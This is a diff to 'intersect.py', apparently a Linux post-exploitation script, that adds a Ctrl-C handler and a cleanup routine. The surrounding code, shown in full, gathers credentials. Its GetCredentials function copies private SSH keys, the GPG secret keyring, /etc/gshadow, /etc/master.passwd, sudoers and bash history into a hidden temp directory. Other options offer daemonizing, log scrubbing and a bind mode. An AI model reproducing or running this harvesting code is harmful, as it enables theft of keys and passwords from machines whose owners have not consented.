@@ -26,7 +26,7 @@
 #    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #--------------------------------------------------------------------------------------------------
 
-import sys, os, re
+import sys, os, re, signal
 from subprocess import Popen,PIPE,STDOUT,call
 import shutil
 import getopt
@@ -73,7 +73,6 @@ def usage():
    print("  -h --help           prints this menu")
    print("usage: ./intersect.py --daemon --network --protection")
    print("       ./intersect.py --all-tests\n")
-   sys.exit()
 
 def environment():
    global Home_Dir
@@ -109,6 +108,9 @@ def environment():
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
 
+   # Setup our signal handler
+   signal.signal(signal.SIGINT, signalHandler)
+   
    # You *might* have to change these: 
    # Tested on Linux ubuntu 3.0.0-12-generic #20-Ubuntu
    UTMP_STRUCT_SIZE    = 384
@@ -127,7 +129,18 @@ def environment():
        os.mkdir(Temp_Dir)
 
    print "[!] Reports will be saved in: %s" % Temp_Dir
+
   
+def signalHandler(signal, frame):
+  print("[!] Ctrl-C caught, shutting down now");
+  Shutdown()
+
+  
+def Shutdown():
+  if not os.listdir(Temp_Dir):
+    os.rmdir(Temp_Dir)
+
+
 def Gather_OS():
    print("[+] Collecting operating system and user information....")
    os.mkdir(Temp_Dir+"/osinfo/")
@@ -205,29 +218,29 @@ def GetCredentials():
        content = content + '\n' + open(f).read()
     open('SSH_Locations.txt','wb').write(content)
     os.system("rm ssh_locations.txt ssh_contents.txt")
-    os.system("cat /etc/sudoers > sudoers.txt")
 
     if os.path.isfile("/etc/master.passwd") is True:
-         shutil.copy2("/etc/master.passwd", Temp_Dir+"/credentials/")
+        shutil.copy2("/etc/master.passwd", Temp_Dir+"/credentials/")
+    os.system('cat /etc/sudoers > sudoers.txt')
     if os.path.isfile("/etc/ssh/sshd_config") is True:
-         shutil.copy2("/etc/ssh/sshd_config", Temp_Dir+"/credentials/") 
+        shutil.copy2("/etc/ssh/sshd_config", Temp_Dir+"/credentials/") 
     if os.path.isfile(Home_Dir+'/.ssh/id_dsa') is True:
-         shutil.copy2(Home_Dir+'/.ssh/id_dsa', Temp_Dir+"/credentials/")
+        shutil.copy2(Home_Dir+'/.ssh/id_dsa', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_dsa.pub') is True:
-         shutil.copy2(Home_Dir+'/.ssh/id_dsa.pub', Temp_Dir+"/credentials/")
+        shutil.copy2(Home_Dir+'/.ssh/id_dsa.pub', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_rsa') is True:
          shutil.copy2(Home_Dir+'/.ssh/id_rsa', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_rsa.pub') is True: 
          shutil.copy2(Home_Dir+'/.ssh/id_rsa.pub', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.gnupg/secring.gpg') is True:
-         shutil.copy2(Home_Dir+'/.gnupg/secring.gpg', Temp_Dir+"/credentials/")
+           shutil.copy2(Home_Dir+'/.gnupg/secring.gpg', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+"/.ssh/authorized_keys") is True:
-         shutil.copy2(Home_Dir+'/.ssh/authorized_keys', Temp_Dir+"/credentials/")  
+           shutil.copy2(Home_Dir+'/.ssh/authorized_keys', Temp_Dir+"/credentials/")  
     if os.path.isfile(Home_Dir+"/.ssh/known_hosts") is True:               
-         shutil.copy2(Home_Dir+'/.ssh/known_hosts', Temp_Dir+"/credentials/")
+          shutil.copy2(Home_Dir+'/.ssh/known_hosts', Temp_Dir+"/credentials/")
     shutil.copy2(Home_Dir+'/.bash_history', Temp_Dir+"/credentials/bash_history.txt")
     if os.path.isfile("/etc/gshadow") is True:
-         shutil.copy2("/etc/gshadow", Temp_Dir+"/credentials/")
+        shutil.copy2("/etc/gshadow", Temp_Dir+"/credentials/")
 
     os.system("lastlog > lastlog.txt")
     os.system("last > last.txt")
@@ -660,21 +673,19 @@ def daemon(stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     
 
 def main(argv):
-    # figure out way to run environment() ONLY if a user gives an option
-    # or if i must create it anyways, rm -rf the empty directory if it isnt used by commands
     try:
         opts, args = getopt.getopt(argv, "dhtonlcpsba", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "protection", "scrub", "bind", "all-tests"])
     except getopt.GetoptError, err:
         print str(err) 
         usage()
-        sys.exit(2)
+        Shutdown()
     for o, a in opts:
         if o in ("-d", "--daemon"):
             daemon()
         elif o in ("-h", "--help"):
             usage()
-           # os.system("rm -rf %s" % Temp_Dir)
-            sys.exit()
+	    Shutdown()
+	    sys.exit(2)	
         elif o in ("-t", "--tar"):
             MakeArchive()
         elif o in ("-o", "--os-info"):
@@ -700,10 +711,11 @@ def main(argv):
              MakeArchive()   
         else:
             assert False, "unhandled option"
-    # Fix Environment() so it only creates temp directory when it *needs* it. Not everytime the script is executed(ie ./intersect.py --help)
-    # Sorry, I'll do it soon. Deal with it or fix it ;-)
+    Shutdown()
+  
 environment()
 if __name__ == "__main__":
     if len(sys.argv) <=1:
         usage()
     main(sys.argv[1:])
+
